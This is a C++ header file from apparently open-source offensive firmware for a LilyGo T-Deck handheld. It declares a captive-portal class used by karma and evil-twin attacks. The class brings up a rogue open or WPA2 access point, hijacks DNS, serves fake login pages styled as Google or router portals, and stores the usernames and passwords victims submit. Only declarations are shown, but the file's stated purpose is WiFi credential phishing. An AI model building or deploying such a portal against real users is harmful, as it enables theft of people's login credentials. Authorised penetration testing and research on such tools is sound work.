// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Reusable captive portal — open (or WPA2) soft-AP + DNS hijack + OS probe
// redirects + field-agnostic credential capture. The caller polls in its loop
// and persists creds AFTER end() (end() tears the AP down first → GDMA-safe).
// Shared so karma, eviltwin and future responder/apbridge use one tested portal
// instead of each copying the DNS/WebServer/field-classifier logic.

#ifndef CAPTIVE_PORTAL_H
#define CAPTIVE_PORTAL_H

#include <Arduino.h>
#include <WebServer.h>
#include <DNSServer.h>

#define CP_MAX_CREDS 24

struct CpCred { char user[48]; char pass[48]; };

// Built-in portal templates (shared — Generic / Google / Router).
int         cpBuiltinCount();
const char* cpBuiltinName(int idx);

// Result of cpPickTemplate(): builtin >= 0 → use that built-in; else sdPath holds an SD file.
struct CpChoice { int builtin; char sdPath[96]; };

// Paginated picker UI: lists the built-ins + every *.html/*.htm in `sdDir`.
// Returns true and fills `out` if the user picks one; false on cancel.
// Call BEFORE CaptivePortal::begin() (pure UI, no WiFi).
bool cpPickTemplate(const char* sdDir, CpChoice& out);

class CaptivePortal {
public:
    // open=true → open AP; else WPA2 with `psk` (>=8 chars). Brings up AP+DNS+HTTP.
    bool begin(const char* ssid, bool open, const char* psk = "trexkarma", uint8_t channel = 6);
    void poll();    // call every loop iteration: services DNS + HTTP
    void end();     // stop server+dns, drop AP, return WiFi to STA (then SD is safe)

    int  clients() const;                                   // live associated STAs
    int  credCount()  const { return _credCount; }          // total POSTs seen
    int  storedCount() const { return _credCount < CP_MAX_CREDS ? _credCount : CP_MAX_CREDS; }
    const CpCred* creds() const { return _creds; }
    const char*   lastUser() const { return _lastUser; }
    const char*   lastPass() const { return _lastPass; }

    // Page selection (call BEFORE begin() so SD is read while WiFi is idle):
    void setTemplate(const char* html) { _html = html; }    // serve a RAM string
    void useBuiltin(int idx);                               // 0..cpBuiltinCount()-1
    bool loadTemplate(const char* sdPath);                  // load an SD .html into RAM; false=missing
    bool usingCustom() const { return _htmlStore.length() > 0; }

private:
    WebServer     _srv{80};
    DNSServer     _dns;
    WiFiEventId_t _evConn = 0, _evDisc = 0;
    const char*   _html   = nullptr;   // points at built-in, a RAM string, or _htmlStore
    String        _htmlStore;          // holds an SD-loaded template (keeps _html valid)
    CpCred        _creds[CP_MAX_CREDS];
    int           _credCount = 0;
    char          _lastUser[48] = {0};
    char          _lastPass[48] = {0};

    void routes();
    void handleRoot();
    void handleCapture();
    void handleRedirect();
    bool captureArgs();
};

#endif // CAPTIVE_PORTAL_H
